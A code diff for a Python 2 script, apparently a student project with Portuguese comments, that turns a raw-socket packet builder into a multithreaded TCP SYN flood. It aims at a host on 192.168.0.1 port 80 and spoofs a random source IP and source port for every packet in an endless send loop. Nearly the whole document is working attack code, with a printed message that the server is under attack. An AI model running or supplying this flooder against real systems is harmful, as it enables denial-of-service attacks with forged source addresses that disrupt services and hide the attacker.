@@ -6,7 +6,7 @@
 import socket, sys, random
 from struct import *
 from threading import Thread
-import time
+
 
  
 # checksum functions needed for calculation checksum
@@ -51,11 +51,9 @@ def attack(porta):
     #gera um ip de origem aleatorio, mas com os intervalos sempre de 2 a 254
     #para evitar que sejam todos 255 ou tenha 0.0.0.0
     #source_ip = '.'.join('%s'%random.randint(2, 254) for i in range(4)) 
-    source_ip = '192.168.0.18'
+    #source_ip = '192.168.0.17'
     #dest_ip = '192.168.0.101' # victor
-    dest_ip = '192.168.0.17' # gabriel
-    
-    show_who(source_ip,porta)
+    dest_ip = '192.168.0.1' # gabriel
 
     # ip header fields
     ihl = 5
@@ -67,16 +65,12 @@ def attack(porta):
     ttl = 255
     protocol = socket.IPPROTO_TCP
     check = 10  # python seems to correctly fill the checksum
-    saddr = socket.inet_aton ( source_ip )  #Spoof the source ip address if you want to
+
     daddr = socket.inet_aton ( dest_ip )
      
     ihl_version = (version << 4) + ihl
      
-    # the ! in the pack format string means network order
-    ip_header = pack('!BBHHHBBH4s4s' , ihl_version, tos, tot_len, id, frag_off, ttl, protocol, check, saddr, daddr)
-     
     # tcp header fields
-    source = porta
     dest = 80   # destination port
     seq = 0
     ack_seq = 0
@@ -94,45 +88,60 @@ def attack(porta):
      
     offset_res = (doff << 4) + 0
     tcp_flags = fin + (syn << 1) + (rst << 2) + (psh <<3) + (ack << 4) + (urg << 5)
-     
-    # the ! in the pack format string means network order
-    tcp_header = pack('!HHLLBBHHH' , source, dest, seq, ack_seq, offset_res, tcp_flags,  window, check, urg_ptr)
-     
-    # pseudo header fields
-    source_address = socket.inet_aton( source_ip )
+
     dest_address = socket.inet_aton(dest_ip)
     placeholder = 0
     protocol = socket.IPPROTO_TCP
-    tcp_length = len(tcp_header)
-     
-    psh = pack('!4s4sBBH' , source_address , dest_address , placeholder , protocol , tcp_length);
-    psh = psh + tcp_header;
-     
-    tcp_checksum = checksum(psh)
-     
-    # make the tcp header again and fill the correct checksum
-    tcp_header = pack('!HHLLBBHHH' , source, dest, seq, ack_seq, offset_res, tcp_flags,  window, tcp_checksum , urg_ptr)
-     
-    # final full packet - syn packets dont have any data
-    packet = ip_header + tcp_header
      
     #Send the packet finally - the port specified has no effect
-         
+    print 'O servidor',dest_ip,'esta sendo atacado'
+     
     #put the above line in a loop like while 1: if you want to flood
     while True:
+        #parte de gerar o pacote IP, para cada novo endereco de origem de IP gerado
+        #gera um ip de origem aleatorio, mas com os intervalos sempre de 2 a 254
+        #para evitar que sejam todos 255 ou tenha 0.0.0.0
+        source_ip = '.'.join('%s'%random.randint(2, 254) for i in range(4))  
+        saddr = socket.inet_aton ( source_ip )
+        # the ! in the pack format string means network order
+        ip_header = pack('!BBHHHBBH4s4s' , ihl_version, tos, tot_len, id, frag_off, ttl, protocol, check, saddr, daddr)
+
+        #parte de gerar o pacote TCP, para cada nova porta gerada
+        source = random.randint(4000, 9000) # gera portas de origem aleatorias, entre os intervalos 4000 e 9000
+        # the ! in the pack format string means network order
+        tcp_header = pack('!HHLLBBHHH' , source, dest, seq, ack_seq, offset_res, tcp_flags,  window, check, urg_ptr)
+
+        # pseudo header fields
+        source_address = socket.inet_aton( source_ip )
+        tcp_length = len(tcp_header)
+
+        psh = pack('!4s4sBBH' , source_address , dest_address , placeholder , protocol , tcp_length);
+        psh = psh + tcp_header;
+         
+        tcp_checksum = checksum(psh)
+         
+        # make the tcp header again and fill the correct checksum
+        tcp_header = pack('!HHLLBBHHH' , source, dest, seq, ack_seq, offset_res, tcp_flags,  window, tcp_checksum , urg_ptr)
+         
+        # final full packet - syn packets dont have any data
+        packet = ip_header + tcp_header
+
         s.sendto(packet, (dest_ip , 0 ))    # put this in a loop if you want to flood the target
+
     
 
-def count_time(max,begin,time_until_now):
-    begin = time.time()
-    duration = 0
+# def count_time(max):
+#     import time
+#     begin = time.time()
+#     duration = 0
 
-    while(duration<max):
-        time_until_now = time.time()
-        duration = time_until_now - begin
-
-    if(duration>max):
-        print 'oi'    
+#     while True:
+#         time_until_now = time.time()
+#         duration = time_until_now - begin
+#         if duration > max:
+#         	print 'entrou aqui', duration
+#         	begin = time.time()
+        	
 
 
 
@@ -140,7 +149,7 @@ ataque1 = Thread(target=attack,args=[5000])
 ataque2 = Thread(target=attack,args=[6001])
 ataque3 = Thread(target=attack,args=[7002])
 ataque4 = Thread(target=attack,args=[8003])
-#time = Thread(target=count_time,args=[10,begin,time_until_now])
+#time = Thread(target=count_time,args=[10])
 
 show_begin()
 
